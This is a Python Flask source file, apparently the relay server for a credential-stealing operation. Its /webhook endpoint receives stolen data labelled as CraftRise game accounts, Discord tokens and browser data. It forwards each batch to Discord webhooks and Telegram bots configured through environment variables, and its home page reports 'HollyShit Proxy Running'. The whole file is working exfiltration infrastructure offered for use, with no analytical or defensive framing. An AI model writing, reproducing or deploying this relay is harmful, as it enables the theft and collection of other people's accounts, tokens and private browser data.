from flask import Flask, request, jsonify
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# Environment variables'dan alınacak (Render'da gizli)
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")

def send_discord(url, content):
    if url:
        try:
            requests.post(url, json={"content": content}, timeout=30)
        except:
            pass

def send_telegram(token, chat_id, msg):
    if token and chat_id:
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except:
            pass

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    log_type = data.get("type", "unknown")
    payload = data.get("data", {})
    
    print(f"[{datetime.now()}] Type: {log_type}")
    
    if log_type == "craftrise":
        msg = f"🎮 CraftRise Account!\n```\n{json.dumps(payload, indent=2)}\n```"
        send_discord(CRAFTRISE_WEBHOOK, msg)
        send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, msg)
        
    elif log_type == "discord":
        msg = f"💎 Discord Token!\n```\n{json.dumps(payload, indent=2)}\n```"
        send_discord(DISCORD_WEBHOOK, msg)
        send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, msg)
        
    elif log_type == "browser":
        msg = f"🕸️ Browser Data!\n```\n{json.dumps(payload, indent=2)[:1000]}\n```"
        send_discord(MASTER_WEBHOOK, msg)
        
    else:
        msg = f"📦 Summary!\n```\n{json.dumps(payload, indent=2)}\n```"
        send_discord(WEBHOOK, msg)
        send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
    
    return jsonify({"status": "ok"}), 200

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)